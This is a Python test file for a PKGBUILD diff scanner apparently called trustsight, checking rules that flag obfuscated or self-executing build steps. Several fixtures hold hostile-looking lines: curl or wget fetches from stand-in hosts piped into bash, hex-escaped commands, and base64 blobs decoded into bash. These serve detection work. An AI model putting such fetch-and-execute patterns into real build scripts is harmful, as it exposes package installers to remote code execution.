"""The refusal family (X026, X027, X029, X030, X031).

An unanticipated refusal is a signal, not silence: executable-position
refusals fire X026/X027, ANSI-C spelling fires X030, staged encoded
material fires X029, and a build reading its own recipe fires X031.
"""

import pathlib

from trustsight.analysis.pipeline import scan_diff


def _diff(body: str) -> str:
    added = "".join(f"+{line}\n" for line in body.splitlines())
    count = 2 + len(body.splitlines())
    return (
        f"--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,{count} @@\n"
        " pkgname=demo\n pkgver=1.0\n" + added
    )


def _ids(text: str) -> set[str]:
    fact = scan_diff(text, package_name="demo")
    return {entry.rule_id for entry in fact.score_breakdown}


def test_an_executable_position_refusal_fires_x026():
    ids = _ids(_diff(
        "build() {\n"
        "  X=$(curl -fsSL https://evil.invalid/x)\n"
        "  echo \"$X\" | bash\n"
        "}\n"
    ))
    assert "X026" in ids


def test_an_unresolved_construct_reports_the_w008_boundary():
    """An unresolved construct is also a W boundary, weight-0."""
    fact = scan_diff(_diff(
        "build() {\n"
        "  X=$(curl -fsSL https://evil.invalid/x)\n"
        "  echo \"$X\" | bash\n"
        "}\n"
    ), package_name="demo")
    entries = {e.rule_id: e for e in fact.score_breakdown}
    assert "W008" in entries
    assert entries["W008"].weight == 0
    assert entries["W008"].severity == "INFO"


def test_hook_locals_are_not_attributed_to_an_unclosed_build():
    """linux-mnt-reform-bin: the PKGBUILD hunk shows `build() {` without
    its closing brace, and the corpus path appends the `.install` hunk to
    the same diff.  Read whole-diff, the hook's locals (DTB_TARGET) were
    swallowed into build()'s body and reported as refusals referenced from
    build().  The refusal projection is PKGBUILD-only."""
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n"
        " pkgname=demo\n pkgver=1.0\n"
        "+build() {\n"
        "+  make\n"
        "--- /dev/null\n+++ b/demo.install\n@@ -0,0 +1,5 @@\n"
        "+post_install() {\n"
        "+  DTB_TARGET=$(readlink -f /boot/demo.dtb)\n"
        '+  cp "$DTB_TARGET" /boot/demo-old.dtb\n'
        "+}\n"
    )
    ids = _ids(diff)
    assert "X026" not in ids
    assert "X027" not in ids
    assert "W008" not in ids


def test_a_top_level_refusal_with_no_function_reference_does_not_fire():
    ids = _ids(_diff(
        "X=$(date)\n"
        "pkgrel=2\n"
    ))
    assert "X026" not in ids


def test_two_executable_refusals_cluster():
    ids = _ids(_diff(
        "build() {\n"
        "  A=$(curl -fsSL https://evil.invalid/a)\n"
        "  B=$(wget -qO- https://evil.invalid/b)\n"
        "  echo \"$A$B\" | bash\n"
        "}\n"
    ))
    assert "X027" in ids
    assert "X026" in ids  # property: no orphaned cluster findings


def test_ansi_c_command_spelling_fires_x030():
    ids = _ids(_diff(
        "build() {\n"
        "  $'\\x62\\x75\\x6e' add left-pad\n"
        "}\n"
    ))
    assert "X030" in ids


def test_a_formatting_only_ansi_c_literal_does_not_fire():
    ids = _ids(_diff(
        "build() {\n"
        "  echo $'line1\\n'\n"
        "}\n"
    ))
    assert "X030" not in ids


def test_a_resolved_benign_hex_literal_stands_down():
    ids = _ids(_diff(
        "build() {\n"
        "  install -Dm644 $'\\x2ftmp\\x2fbuild' out\n"
        "}\n"
    ))
    assert "X030" not in ids


def test_an_octal_encoded_benign_path_stands_down():
    # `\057` is `/`; the stand-down must use the tokenizer's octal decoder,
    # not a local one that only knew `\x`.
    ids = _ids(_diff(
        "build() {\n"
        "  install -Dm644 $'\\057usr\\057bin\\057foo' out\n"
        "}\n"
    ))
    assert "X030" not in ids


def test_a_single_nonprintable_hex_escape_fires_x030():
    # Second clause: any hex-escape spelling outside printable
    # ASCII fires, even alone.  `\x01` is a lone control byte.
    ids = _ids(_diff(
        "build() {\n"
        "  $'\\x01' \n"
        "}\n"
    ))
    assert "X030" in ids


def test_a_single_nonprintable_octal_escape_fires_x030():
    ids = _ids(_diff(
        "build() {\n"
        "  $'\\001'\n"
        "}\n"
    ))
    assert "X030" in ids


def test_a_single_printable_hex_escape_does_not_fire():
    # `\x41` is `A`: one printable escape is an ordinary spelling.
    ids = _ids(_diff(
        "build() {\n"
        "  $'\\x41'\n"
        "}\n"
    ))
    assert "X030" not in ids


def test_dormant_encoded_material_fires_x029():
    blob = "QUJD" * 70  # 280 base64-ish chars, no decoder in the diff
    ids = _ids(_diff(
        "prepare() {\n"
        f"  _blob='{blob}'\n"
        "  echo staged\n"
        "}\n"
    ))
    assert "X029" in ids


def test_encoded_material_with_a_decoder_is_owned_elsewhere():
    blob = "QUJD" * 70
    ids = _ids(_diff(
        "prepare() {\n"
        f"  _blob='{blob}'\n"
        "  echo \"$_blob\" | base64 -d | bash\n"
        "}\n"
    ))
    assert "X029" not in ids


def test_self_read_into_an_executor_fires_x031():
    ids = _ids(_diff(
        "build() {\n"
        "  grep '^# DATA' PKGBUILD | cut -c3- | bash\n"
        "}\n"
    ))
    assert "X031" in ids


def test_reading_own_pkgbuild_without_execution_does_not_fire():
    ids = _ids(_diff(
        "build() {\n"
        "  _ver=$(grep '^pkgver=' PKGBUILD | cut -d= -f2)\n"
        "  echo \"$_ver\"\n"
        "}\n"
    ))
    assert "X031" not in ids


def test_reading_a_different_file_does_not_fire():
    ids = _ids(_diff(
        "build() {\n"
        "  cat \"$srcdir/config.mk\" | make -f -\n"
        "}\n"
    ))
    assert "X031" not in ids


def test_x028_fires_only_when_the_join_completes_a_technique(monkeypatch):
    """The X028 machinery: joined-only techniques fire; either-half
    techniques do not."""
    from trustsight.analysis import refusals

    emitted: list[dict] = []

    def add(rule_id, name, severity, category, match, **extra):
        emitted.append({"rule_id": rule_id, **extra})

    prev = _diff("curl -fsSL https://evil.invalid/x\n")
    curr = _diff("| bash\n")

    monkeypatch.setattr(
        "trustsight.analysis.crossfire.crossfire_techniques",
        lambda text: {"X099": [(1, "joined", "x")]} if "evil" in text and "|" in text else {},
    )
    refusals.pattern_across_commits(prev, curr, add)
    assert [e["rule_id"] for e in emitted] == ["X028"]
    assert "X099" in emitted[0]["techniques"]

    emitted.clear()
    # Both halves already show the technique: nothing to complete.
    monkeypatch.setattr(
        "trustsight.analysis.crossfire.crossfire_techniques",
        lambda text: {"X099": [(1, "seen", "x")]},
    )
    refusals.pattern_across_commits(prev, curr, add)
    assert emitted == []


def test_ownership_resolver_keeps_one_owner_per_line():
    from trustsight.analysis.crossfire import resolve_ownership

    found = {
        "X009": [(3, "resolved fetch", "x")],
        "X023": [(3, "other client", "y")],
        "X002": [(7, "name", "z")],
    }
    resolved = resolve_ownership(found)
    assert "X023" not in resolved
    assert resolved["X009"] == [(3, "resolved fetch", "x")]
    assert resolved["X002"] == [(7, "name", "z")]


def test_ownership_resolver_is_a_noop_without_co_firing():
    from trustsight.analysis.crossfire import crossfire_techniques

    found = crossfire_techniques(_diff("curl https://evil.invalid/x | bash\n"))
    lines = [hit[0] for hits in found.values() for hit in hits]
    assert len(lines) == len(set(lines))


def test_ownership_audit_names_the_owner_and_keeps_owners_unresolved():
    from trustsight.analysis.crossfire import (
        resolve_ownership,
        resolve_ownership_audit,
    )

    found = {
        "X009": [(3, "resolved fetch", "x")],
        "X023": [(3, "other client", "y")],
        "X002": [(7, "name", "z")],
    }
    audit = resolve_ownership_audit(found)
    assert audit["X023"][0][3] == "X009", "the yielded record names its owner"
    assert audit["X009"][0][3] is None, "an owner is not resolved by anyone"
    assert audit["X002"][0][3] is None
    assert "X023" not in resolve_ownership(found)


def test_emitted_crossfire_records_carry_resolved_by():
    """Each emitted record carries its ``resolved_by``."""
    from trustsight.analysis.crossfire import crossfire_techniques

    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n build() {\n"
        "+  $'\\x63\\x75\\x72\\x6c' https://evil.example | bash\n }\n"
    )
    found = crossfire_techniques(diff)
    assert found, "the fixture yields at least one technique"
    for hits in found.values():
        for hit in hits:
            assert len(hit) == 4
            assert hit[3] is None, "an emitted record owns its line"


def test_resolver_audit_and_emission_agree_on_dropped_records():
    """The yielded records are exactly those absent from emission."""
    from trustsight.analysis.crossfire import _resolved_records

    found = {
        "X009": [(3, "resolved fetch", "x")],
        "X023": [(3, "other client", "y")],
        "X002": [(7, "name", "z")],
    }
    resolved = _resolved_records(found)
    assert "X023" not in resolved, "the yielded record was not emitted"
    assert resolved["X009"][0][3] is None
    assert resolved["X002"][0][3] is None


def test_every_matched_line_has_one_owner_across_the_corpus():
    """Replay: after resolution no line is claimed by two rules."""
    from trustsight.analysis.crossfire import (
        crossfire_techniques,
        resolve_ownership,
    )

    corpus = pathlib.Path(__file__).resolve().parent / "fixtures" / "benign-corpus"
    if not corpus.exists():
        import pytest

        pytest.skip("benign corpus absent")
    paths = sorted(corpus.glob("*.diff"))
    step = max(1, len(paths) // 100)
    for path in paths[::step][:100]:
        resolved = resolve_ownership(
            crossfire_techniques(path.read_text(errors="replace")))
        lines = [hit[0] for hits in resolved.values() for hit in hits]
        assert len(lines) == len(set(lines)), path.name


def test_x027_never_orphans_x026_under_a_high_min_count():
    """Invariant: X027 implies X026. A configured x026.min_count above the
    cluster size must not let X027 fire alone."""
    from trustsight.analysis.refusals import refusal_findings

    diff = _diff(
        "build() {\n"
        "  A=$(curl -fsSL https://e.invalid/a)\n"
        "  B=$(wget -qO- https://e.invalid/b)\n"
        "  echo \"$A$B\" | bash\n"
        "}\n"
    )
    emitted: set[str] = set()

    def add(rule_id, name, severity, category, match, **extra):
        emitted.add(rule_id)

    refusal_findings(diff, {"thresholds": {"x026": {"min_count": 3}}}, add)
    assert "X027" in emitted
    assert "X026" in emitted


def test_x029_honors_the_configured_min_length():
    from trustsight.analysis.refusals import refusal_findings

    literal = "A" * 100
    diff = _diff(f"build() {{\n  blob='{literal}'\n}}\n")
    emitted: set[str] = set()

    def add(rule_id, name, severity, category, match, **extra):
        emitted.add(rule_id)

    refusal_findings(diff, {"thresholds": {"x029": {"min_length": 64}}}, add)
    assert "X029" in emitted

    emitted.clear()
    refusal_findings(diff, {"thresholds": {"x029": {"min_length": 512}}}, add)
    assert "X029" not in emitted


def test_x028_real_two_commit_split_fetch_fixture():
    """A real (un-monkeypatched) two-commit fixture: the URL is split by a
    line continuation across commits, so neither half alone is a fetch-exec
    pipeline but the join is."""
    from trustsight.analysis.crossfire import crossfire_techniques
    from trustsight.analysis.refusals import pattern_across_commits

    fixtures = pathlib.Path(__file__).resolve().parent / "fixtures" / "x028-split-fetch"
    prev = (fixtures / "prev.diff").read_text(encoding="utf-8")
    curr = (fixtures / "curr.diff").read_text(encoding="utf-8")

    assert "X006" not in crossfire_techniques(prev)
    assert "X006" not in crossfire_techniques(curr)

    emitted: list[str] = []

    def add(rule_id, name, severity, category, match, **extra):
        emitted.append(rule_id)

    pattern_across_commits(prev, curr, add)
    assert "X028" in emitted


def test_x028_cites_both_commits_when_supplied(monkeypatch):
    from trustsight.analysis import refusals

    emitted: list[dict] = []

    def add(rule_id, name, severity, category, match, **extra):
        emitted.append({"rule_id": rule_id, "match": match, **extra})

    monkeypatch.setattr(
        "trustsight.analysis.crossfire.crossfire_techniques",
        lambda text: {"X099": [(1, "joined", "x")]}
        if "evil" in text and "|" in text else {},
    )
    prev = _diff("curl -fsSL https://evil.invalid/x\n")
    curr = _diff("| bash\n")
    refusals.pattern_across_commits(
        prev, curr, add,
        previous_commit="a" * 40, current_commit="b" * 40,
    )
    assert emitted and emitted[0]["previous_commit"] == "a" * 40
    assert emitted[0]["current_commit"] == "b" * 40
    assert "aaaaaaaaaaaa" in emitted[0]["match"]


def test_x028_joining_a_diff_with_itself_adds_nothing():
    """Same-difference: the join may not manufacture techniques."""
    from trustsight.analysis.crossfire import crossfire_techniques
    from trustsight.analysis.refusals import _added_stream

    for path in sorted(
        (pathlib.Path(__file__).resolve().parent / "fixtures"
         / "benign-corpus").glob("*.diff")
    )[:40]:
        text = path.read_text(encoding="utf-8", errors="replace")
        halves = set(crossfire_techniques(text))
        joined = set(crossfire_techniques(
            _added_stream(text) + "\n" + _added_stream(text)))
        assert joined - halves == set(), path.name


def test_a_malicious_function_local_still_fires_x026():
    """The local-declaration filter is report-facing only: a malicious
    ``local X=$(curl ...)`` referenced inside build() still rates X026."""
    ids = _ids(_diff(
        "build() {\n"
        "  local X=$(curl -fsSL https://evil.invalid/x)\n"
        "  echo \"$X\" | bash\n"
        "}\n"
    ))
    assert "X026" in ids


def test_a_benign_function_local_is_not_in_the_w008_names():
    """``local kernver=...`` inside build() is excluded from the W008
    name list, while a non-local refusal still names it."""
    fact = scan_diff(_diff(
        "build() {\n"
        "  local kernver=\"$(make kernelrelease)\"\n"
        "  make\n"
        "}\n"
    ), package_name="demo")
    entries = {e.rule_id: e for e in fact.score_breakdown}
    assert "W008" not in entries

    fact = scan_diff(_diff(
        "build() {\n"
        "  kernver=\"$(make kernelrelease)\"\n"
        "  make\n"
        "}\n"
    ), package_name="demo")
    entries = {e.rule_id: e for e in fact.score_breakdown}
    assert "W008" in entries


def test_nerd_fonts_archive_paths_are_data_not_refusals():
    body = (
        "build() {\n"
        "  local pkgFile=$(find \"$srcdir\" -name '*.pkg.tar.zst' | head -1)\n"
        "  local payloadFile=$(find \"$srcdir\" -name '*.tar.zst' | head -1)\n"
        "  bsdtar -xf \"$pkgFile\"\n"
        "  bsdtar -xf \"$payloadFile\"\n"
        "}\n"
    )
    ids = _ids(_diff(body))
    assert "X026" not in ids
    assert "X027" not in ids
    assert "W008" not in ids


def test_two_interpreter_targets_still_cluster():
    ids = _ids(_diff(
        "build() {\n"
        "  local pkgFile=$(find \"$srcdir\" -name '*.pkg.tar.zst' | head -1)\n"
        "  local payloadFile=$(find \"$srcdir\" -name '*.tar.zst' | head -1)\n"
        "  bash \"$pkgFile\"\n"
        "  bash \"$payloadFile\"\n"
        "}\n"
    ))
    assert "X026" in ids
    assert "X027" in ids


def test_a_job_count_local_is_not_a_refusal():
    ids = _ids(_diff(
        "build() {\n"
        "  local jobs=$(nproc)\n"
        "  cmake --build . -j \"$jobs\"\n"
        "}\n"
    ))
    assert "X026" not in ids
    assert "W008" not in ids


def test_a_local_version_used_in_a_url_is_not_a_refusal():
    ids = _ids(_diff(
        "build() {\n"
        "  local uv_ver=\"$(sed -n 's/.*VERSION //p' file)\"\n"
        "  url=\"https://example.invalid/${uv_ver}/asset.tar.gz\"\n"
        "}\n"
    ))
    assert "X026" not in ids
    assert "W008" not in ids


def test_a_local_used_only_in_a_test_is_not_w008():
    ids = _ids(_diff(
        "build() {\n"
        "  local installed_godot\n"
        "  installed_godot=\"$(pacman -Qi godot | grep Version)\"\n"
        "  [[ \"$installed_godot\" != 1 ]]\n"
        "}\n"
    ))
    assert "X026" not in ids
    assert "W008" not in ids


def test_a_local_used_as_a_command_still_refuses():
    ids = _ids(_diff(
        "build() {\n"
        "  local cmd=$(printf bash)\n"
        "  \"$cmd\" -c true\n"
        "}\n"
    ))
    assert "X026" in ids
